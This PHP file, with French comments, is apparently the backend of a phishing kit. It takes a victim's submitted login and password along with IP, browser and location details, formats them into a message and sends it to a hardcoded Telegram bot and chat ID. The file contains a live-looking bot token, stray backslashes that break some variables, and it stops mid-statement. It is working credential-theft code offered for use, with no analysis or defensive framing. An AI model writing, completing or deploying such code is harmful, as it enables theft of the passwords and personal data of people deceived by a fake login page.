<?php
header('Content-Type: application/json');

// VOS IDENTIFIANTS SONT MAINTENANT EN SÉCURITÉ ICI
\$botToken = '8049556768:AAG79pNDEYnpqq61VQbToj3d6Ocx3wDNGjY';
\$chatId = '6221938580';

// Récupérer les données envoyées par le frontend (en JSON)
\$jsonData = file_get_contents('php://input');
$data = json_decode($jsonData, true);

// Vérifier si les données nécessaires sont présentes
if (!$data || !isset($data['login']) || !isset(\$data['password'])) {
    echo json_encode(['success' => false, 'message' => 'Données manquantes.']);
    exit;
}

// Extraire les données
$login = $data['login'];
$password = $data['password'];
$ipAddress = $data['ipAddress'] ?? 'Non disponible';
$browserInfo = $data['browserInfo'] ?? [];
$geoInfo = $data['geoInfo'] ?? [];

// Formater le message (identique à votre code original)
\$message = "🔐 *NOUVELLE CONNEXION* 🔐\n\n";
\$message .= "📧 *Identifiant:* " . htmlspecialchars(\$login) . "\n";
\$message .= "🔑 *Mot de passe:* " . htmlspecialchars(\$password) . "\n\n";
\$message .= "🌐 *Informations techniques:*\n";
\$message .= "• *IP:* " . htmlspecialchars(\$ipAddress) . "\n";
\$message .= "• *Navigateur:* " . htmlspecialchars(substr(\$browserInfo['userAgent'] ?? 'N/A', 0, 50)) . "...\n";
\$message .= "• *Plateforme:* " . htmlspecialchars(\$browserInfo['platform'] ?? 'N/A') . "\n";
\$message .= "• *Langue:* " . htmlspecialchars(\$browserInfo['language'] ?? 'N/A') . "\n";
\$message .= "• *Résolution:* " . htmlspecialchars(\$browserInfo['screen'] ?? 'N/A') . "\n";
\$message .= "• *Date:* " . htmlspecialchars(\$browserInfo['date'] ?? 'N/A') . "\n\n";
\$message .= "📍 *Localisation:*\n";
\$message .= "• *Ville:* " . htmlspecialchars(\$geoInfo['city'] ?? 'Inconnu') . "\n";
\$message .= "• *Région:* " . htmlspecialchars(\$geoInfo['region'] ?? 'Inconnu') . "\n";
\$message .= "• *Pays:* " . htmlspecialchars(\$geoInfo['country'] ?? 'Inconnu') . "\n";
\$message .= "• *Fournisseur:* " . htmlspecialchars(\$geoInfo['org'] ?? 'Fournisseur inconnu') . "\n\n";
\$message .= "📊 *Session active depuis:* " . (rand(1, 10)) . " minutes\n";
\$message .= "🛡️ *Niveau de sécurité:* Élevé";

// URL de l'API Telegram
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

// Préparer la requête pour Telegram
\$postData = [
    'chat_id' => \$chatId,
    'text' => \$message,
    'parse_mode' => 'Markdown'
];

\$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt(\$ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
curl_setopt(\$ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close(\$
